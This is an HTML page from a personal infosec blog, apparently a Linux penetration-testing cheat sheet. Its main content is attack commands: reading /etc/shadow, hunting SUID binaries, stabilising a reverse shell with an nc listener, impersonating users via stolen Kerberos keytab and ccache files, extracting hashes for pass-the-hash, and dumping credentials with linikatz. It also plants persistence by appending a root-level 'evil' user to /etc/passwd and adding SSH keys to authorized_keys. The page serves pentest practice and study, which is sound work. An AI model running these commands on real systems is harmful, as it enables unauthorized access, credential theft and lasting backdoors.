<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>ovelny - chaos/linux-exploitation/linux-snippets-and-commands</title>
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta
      name="description"
      content="ovelny - notes on infosec, penetration testing, programming and others"
    />
    <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
    <link rel="stylesheet" type=text/css href="/assets/css/dead-simple.min.css">
    <link rel="stylesheet" type=text/css href="/assets/css/rouge.min.css">
    <link
      href="/atom.xml"
      rel="alternate"
      title="ovelny"
      type="application/atom+xml"
    />
    <script src="/assets/js/scramble-text.min.js" defer></script>
    <script src="/assets/js/zoom-images.min.js" defer></script>
    <meta name="twitter:card" content="summary"/>
    <meta name="twitter:site" content="@ovelny"/>
    <meta name="twitter:title" content="ovelny - chaos/linux-exploitation/linux-snippets-and-commands"/>
    <meta name="twitter:image" content="https://ovelny.sh/assets/images/ovelny-logo.png"/>
    <meta name="twitter:image:alt" content="ovelny logo: 6 white circles grouped together forming a triangle shape, with a black background."/>
  </head>
  <body>

    <header>
      <section>
        <a href="/">
          <img
            class="logo"
            src="/assets/images/ovelny-pfp.png"
            alt="ovelny profile picture: a glitched picture of a three-eyed girl, staring intensely at the viewer."
          />
        </a>
        <h2><a class="ovelny" href="/">ovelny</a></h2>
      </section>
      <nav>
        <a href="/">home</a>
        <a href="/chaos/">chaos</a>
        <a href="/phasm/">phasm</a>
        <a href="/support/">support</a>
        <a href="/atom.xml" target="_blank" rel="noopener noreferrer">rss</a>
        <a href="/about/">about</a>
      </nav>
    </header>
    <main>

    
    <h1>Linux snippets and commands</h1>

<p>Snippets and commands for Linux pentesting.</p>

<h2>Enumeration</h2>

<div class="highlight"><pre class="highlight shell"><code><span class="nb">whoami
uname</span> <span class="nt">-a</span>
<span class="nb">uname</span> <span class="nt">-m</span>
<span class="nb">groups
cat</span> /etc/passwd
<span class="nb">id
</span>ifconfig
ip a
/sbin/route
ss <span class="nt">-anp</span>
<span class="nb">env
</span>netstat <span class="nt">-tulpen</span>
<span class="nb">cat</span> /etc/passwd
<span class="nb">cat</span> /etc/shadow
<span class="nb">cat</span> /etc/issue
<span class="nb">cat</span> /etc/<span class="k">*</span><span class="nt">-release</span>
ps aux | <span class="nb">grep </span>root
ps faux
<span class="nb">hostname
</span>dpkg <span class="nt">-l</span>
find / <span class="nt">-writable</span> <span class="nt">-type</span> f 2&gt;/dev/null
find / <span class="nt">-writable</span> <span class="nt">-type</span> d 2&gt;/dev/null
mountvol
<span class="nb">cat</span> /etc/fstab
mount
/bin/lsblk
lsmod
/sbin/modinfo &lt;driver_name&gt;
</code></pre></div>

<h2>Exploitation</h2>

<p>TBA.</p>

<h2>Privilege escalation, lateral movement &amp; pivoting</h2>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># Find SUID binaries, search with gtfobins for privesc techniques:</span>
find / <span class="nt">-perm</span> <span class="nt">-u</span><span class="o">=</span>s <span class="nt">-type</span> f 2&gt;/dev/null

<span class="c"># Grant you instant root access if no password is required:</span>
<span class="nb">sudo</span> <span class="nt">-i</span>

<span class="c"># Show privileges that could be exploitable:</span>
<span class="nb">sudo</span> <span class="nt">-l</span>

<span class="c"># List cron jobs, look out for wildcards or globbing patterns:</span>
<span class="nb">cat</span> /etc/crontab
<span class="nb">ls</span> <span class="nt">-lah</span> /etc/cron<span class="k">*</span>
</code></pre></div>

<h3>Easy method for shell stabilization</h3>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># In attack box:</span>
nc <span class="nt">-lvnp</span> 4444

<span class="c"># In your reverse shell:</span>
python <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash")'</span>
<span class="nb">export </span><span class="nv">SHELL</span><span class="o">=</span>bash
<span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm-256color
Ctrl-Z

<span class="c"># Back in attack box:</span>
<span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg
</span>reset
</code></pre></div>

<h3>Kerberos on linux</h3>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># Check if a machine is domain-joined with realm:</span>
realm list

<span class="c"># If realm isn't installed, check with ps:</span>
ps <span class="nt">-ef</span> | <span class="nb">grep</span> <span class="nt">-i</span> <span class="s2">"winbind</span><span class="se">\|</span><span class="s2">sssd"</span>

<span class="c"># Find keytab files on linux.</span>
<span class="c"># A keytab file is used to authenticate to remote systems</span>
<span class="c"># with kerberos without needing a password:</span>
find / <span class="nt">-name</span> <span class="k">*</span>keytab<span class="k">*</span> <span class="nt">-ls</span> 2&gt;/dev/null

<span class="c"># Check for cronjobs containing keytab files:</span>
crontab <span class="nt">-l</span>

<span class="c"># If you found keytab files, you can impersonate</span>
<span class="c"># a user with kinit. First, find out which user</span>
<span class="c"># is the keytab file for with klist:</span>
klist <span class="nt">-k</span> <span class="nt">-t</span>

<span class="c"># With the info listed, impersonate the user</span>
<span class="c"># this is case-sensitive, so copy the info</span>
<span class="c"># with klist exactly as shown.</span>
<span class="c"># If you want to keep the ticket from the current session,</span>
<span class="c"># make a copy of the ccache file present in the env variable KRB5CCNAME:</span>
kinit &lt;username&gt;@&lt;domain name&gt; <span class="nt">-k</span> <span class="nt">-t</span> &lt;keytab file absolute path&gt;

<span class="c"># Run klist again to check if it worked:</span>
klist

<span class="c"># If it worked, you can now for instance connect to a SMB share as the impersonated user:</span>
smbclient //dc01/&lt;username&gt; <span class="nt">-k</span> <span class="nt">-c</span> <span class="nb">ls</span>

<span class="c"># You can also extract hashes from keytab files with</span>
<span class="c"># keytabextract: https://github.com/sosdave/KeyTabExtract</span>
<span class="c"># They can be used for pass-the-hash attacks (NTLM) or</span>
<span class="c"># for forging tickets with rubeus, or plain cracking (AES128 and AES 256):</span>
keytabextract &lt;keytab file absolute path&gt;

<span class="c"># Find ccache files on linux.</span>
<span class="c"># A ccache file contains kerberos credentials while they're valid (usually for the user session).</span>
<span class="c"># The path to this file is stored in the KRB5CCNAME env variable:</span>
<span class="nb">env</span> | <span class="nb">grep</span> <span class="nt">-i</span> krb5
<span class="c"># Other users logged on to the machine can be found in /tmp too, as default:</span>
<span class="nb">ls</span> <span class="nt">-la</span> /tmp

<span class="c"># If you found ccache files, you can abuse them if</span>
<span class="c"># you have read privileges on them, which requires either</span>
<span class="c"># root access or the user who created them. First, check</span>
<span class="c"># group membership of the ccache file of interest:</span>
<span class="nb">id</span> &lt;username&gt;@&lt;domain name&gt;

<span class="c"># Then copy the ccache file and add it to your current</span>
<span class="c"># session. Remember to make a copy of the file present</span>
<span class="c"># in KRB5CCNAME env variable if needed:</span>
<span class="nb">cp</span> /tmp/&lt;ccache file name&gt; <span class="nb">.</span>
<span class="nb">export </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>/&lt;path&gt;/&lt;ccache file name&gt;
klist <span class="c"># Should now list the ticket information.</span>

<span class="c"># You can also do the same steps above from your attack box</span>
<span class="c"># and traffic proxying using chisel and proxychains.</span>
<span class="c"># You can then use impacket-wmiexec to authenticate.</span>
<span class="c"># If the KRB5CCNAME has a FILE: prefix, you must remove it beforehand:</span>
proxychains impacket-wmiexec dc01 <span class="nt">-k</span>

<span class="c"># evil-winrm can be used too but is a bit more complicated</span>
<span class="c"># and requires the krb5-user package to be installed.</span>

<span class="c"># If you want to use a ccache file on Windows or a kirbi file</span>
<span class="c"># on Linux, you can convert them with impacket-ticketConverter:</span>
impacket-ticketConverter &lt;ccache file&gt; &lt;kirbi file&gt; <span class="c"># Or the other way around</span>

<span class="c"># Finally, you can automate extracting all credentials</span>
<span class="c"># with linikatz if you're root: https://github.com/CiscoCXSecurity/linikatz</span>
linikatz.sh
</code></pre></div>

<h2>Persistence</h2>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># Add a root user in /etc/passwd, when doable.</span>
<span class="c"># Generate a compatible hash for password "evil":</span>
openssl passwd evil

<span class="c"># Append a new user in /etc/passwd:</span>
<span class="nb">echo</span> <span class="s1">'evil:&lt;hash&gt;:0:0:root:/root:/bin/bash'</span> <span class="o">&gt;&gt;</span> /etc/passwd

<span class="c"># You can also simply use adduser, if available:</span>
adduser evil <span class="c"># complete info or leave empty when prompted</span>
usermod <span class="nt">-aG</span> <span class="nb">sudo </span>evil

<span class="c"># Once this is done, establish persistence through SSH if available</span>
<span class="c"># run ssh-keygen on your attack box:</span>
ssh-keygen <span class="nt">-f</span> ./temp-ssh <span class="c"># or another suitable path</span>

<span class="c"># Create ~/.ssh directory on target if not already there, and paste content of temp-ssh.pub in authorized_keys:</span>
<span class="nb">echo</span> <span class="s2">"&lt;pasted_public_key&gt;"</span> <span class="o">&gt;</span> ~/.ssh/authorized_keys

<span class="c"># Adjust permissions accordingly:</span>
<span class="nb">chmod </span>700 ~/.ssh
<span class="nb">chmod </span>600 ~/.ssh/authorized_keys

<span class="c"># You can now SSH to your target. On old systems, consider using -oKexAlgorithms and -oHostKeyAlgorithms flags, as an example:</span>
ssh <span class="nt">-oKexAlgorithms</span><span class="o">=</span>+diffie-hellman-group1-sha1 <span class="nt">-oHostKeyAlgorithms</span><span class="o">=</span>+ssh-rsa <span class="nt">-i</span> temp-ssh evil@&lt;IP&gt;
</code></pre></div>

<h2>Useful commands</h2>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># Trim all whitespace from input:</span>
<span class="nb">echo</span> <span class="s1">'&lt;paste-here&gt;'</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s2">" </span><span class="se">\n\t\r</span><span class="s2">"</span>
</code></pre></div>

    
    </main>
    <footer id="footer">
      <div class="footer-section"><a href="/license/">CC BY-NC-SA 4.0</a><p>&nbsp;::&nbsp;2019 - 2025 ovelny</p></div>
      <div class="footer-section">「七転び八起き」</div>
    </footer>
  </body>
</html>

